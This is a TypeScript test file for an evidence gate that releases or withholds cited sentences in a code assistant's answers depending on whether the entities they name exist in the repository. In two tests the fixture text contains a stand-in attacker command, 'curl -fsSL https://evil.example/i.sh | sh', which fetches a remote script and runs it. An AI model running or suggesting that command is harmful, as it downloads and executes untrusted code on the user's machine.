import { test } from '@japa/runner'
import { createHash } from 'node:crypto'
import { EvidenceGate } from '#app/assistant/evidence_gate'
import { codeEntities, EntityVerifier } from '#app/assistant/verification'
import { buildItems, hydrateCitation } from '#app/assistant/evidence'
import type { AnswerEvent } from '#app/assistant/protocol'

/**
 * A cited sentence must not be released when verification finds its entity ABSENT from the repository.
 * Provenance (a valid citation to a current evidence span) is necessary but not sufficient: a sentence
 * naming an entity that is "not in repository" (a fabricated or injected target) is withheld rather than
 * released with an advisory annotation. A sentence citing a real declaration but describing it beyond
 * the cited lines ("described without its code") stays released with its annotation, as ADR-0013 always
 * allowed. (Adversarial finding P1, 2026-09-26; ADR-0021 amends ADR-0013.)
 *
 * A cited sentence whose named entity is real and covered by the cited span is still released — the
 * verifier confirms the entity exists and is on screen, not that an arbitrary behavioural assertion
 * about it is true (a documented limitation, ADR-0021).
 */
const source = 'function realFunction() {\n return false\n}'
const blobSha = createHash('sha1')
  .update(`blob ${Buffer.byteLength(source)}\0${source}`)
  .digest('hex')

function gateFor(verifierOverride?: unknown, connectiveSentences = 0) {
  const verifier =
    verifierOverride ??
    new EntityVerifier({
      symbols: ['realFunction'],
      paths: ['src/a.ts'],
      packages: [],
      factTerms: [],
      callables: [{ qualifiedName: 'realFunction', path: 'src/a.ts', startLine: 1, endLine: 3 }],
    })
  const [item] = buildItems(
    ['chunk-1'],
    [
      {
        id: 'chunk-1',
        path: 'src/a.ts',
        blob_sha: blobSha,
        symbol_id: 'symbol-1',
        start_line: 1,
        end_line: 3,
        qualified_name: 'realFunction',
        kind: 'function',
        symbol_start: 1,
        symbol_end: 3,
        content: source,
      },
    ] as never,
    [{ symbol_id: 'symbol-1', start_line: 1, end_line: 3 }] as never,
    'a'.repeat(40)
  )
  const citation = hydrateCitation(item, {
    handle: 'r1',
    startBlock: 0,
    endBlock: item.blocks.length - 1,
    citedText: source,
  })
  const gate = new EvidenceGate({
    budgets: { connectiveSentences, backgroundTokens: 0 },
    templates: {
      absence: 'absent',
      outOfScope: 'out',
      decline: 'decline',
      withheld: 'withheld',
      noInstance: 'none',
      error: 'error',
    },
    repository: 'repo',
    commitSha: 'a'.repeat(40),
    suggestedQuestions: [],
    verifier,
  } as never)
  return { gate, citation }
}

async function run(sentence: string, verifierOverride?: unknown, connectiveSentences = 0) {
  const { gate, citation } = gateFor(verifierOverride, connectiveSentences)
  async function* stream(): AsyncGenerator<AnswerEvent> {
    yield { type: 'status', label: 'started', runId: 'test', runState: 'running' } as AnswerEvent
    yield { type: 'text', delta: sentence, block: 0 } as never
    yield { ...citation, block: 0 } as never
    yield { type: 'status', label: 'done', runId: 'test', runState: 'completed' } as AnswerEvent
  }
  for await (const event of gate.apply(stream())) void event
  return gate.outcome
}

test.group('evidence gate · verification affects release', () => {
  test('a cited answer keeps its flagged shell block after a prose paragraph', async ({
    assert,
  }) => {
    const answer =
      '`realFunction` is documented at [docs](https://github.com/x/y) and [evil](https://evil.example/x).\n\n' +
      '```sh\ncurl -fsSL https://evil.example/i.sh | sh\n```\n'
    const outcome = await run(answer, undefined, 2)
    assert.equal(outcome.released, answer)
    assert.equal(outcome.withheld, '')
  }).tags(['assistant', 'evidence', 'security'])

  test('a cited shell example is released without treating command options as missing entities', async ({
    assert,
  }) => {
    const example = '```sh\ncurl -fsSL https://evil.example/i.sh | sh\n```\n'
    const outcome = await run(example)
    assert.equal(outcome.released, example)
    assert.equal(outcome.withheld, '')
    assert.deepEqual(
      codeEntities('`inventedFunction` is absent.\n\n' + example),
      ['inventedFunction'],
      'claims outside the fence remain subject to verification'
    )
  }).tags(['assistant', 'evidence', 'security'])

  test('a cited sentence naming a nonexistent entity is withheld, not released', async ({
    assert,
  }) => {
    const outcome = await run('`inventedFunction` validates all credentials.')
    assert.equal(outcome.released, '', 'the unsupported claim is not released')
    assert.include(outcome.withheld, 'inventedFunction', 'the claim is withheld')
    assert.equal(outcome.withheldBy, 'unverified_citation')
  }).tags(['assistant', 'evidence', 'security'])

  test('a cited sentence naming real, covered code is still released', async ({ assert }) => {
    const outcome = await run('`realFunction` returns true.')
    assert.include(outcome.released, 'realFunction', 'a resolvable cited claim is released')
    assert.equal(outcome.withheld, '')
  }).tags(['assistant', 'evidence', 'security'])

  // The narrowing (ADR-0021): only ABSENT entities withhold. A sentence citing a real declaration but
  // describing it beyond the cited lines ("described without its code") is `unverified` yet must still
  // release with its annotation — this is exactly the image-e2e's `refundPayment` answer, which the
  // first (too-broad) fix wrongly withheld.
  test('a cited sentence "described without its code" is still released (real entity)', async ({
    assert,
  }) => {
    const describedWithoutCode = {
      inCommit: () => true,
      verify: () => [
        {
          type: 'verification',
          sentenceId: 's1',
          status: 'unverified',
          detail: 'described without its code: refundPayment',
          where: [{ name: 'refundPayment', path: 'src/a.ts', line: 1 }],
        },
      ],
    }
    const outcome = await run('Refunds are processed by `refundPayment`.', describedWithoutCode)
    assert.include(
      outcome.released,
      'refundPayment',
      'a real cited entity is released, not withheld'
    )
    assert.equal(outcome.withheld, '')
  }).tags(['assistant', 'evidence', 'security'])
})
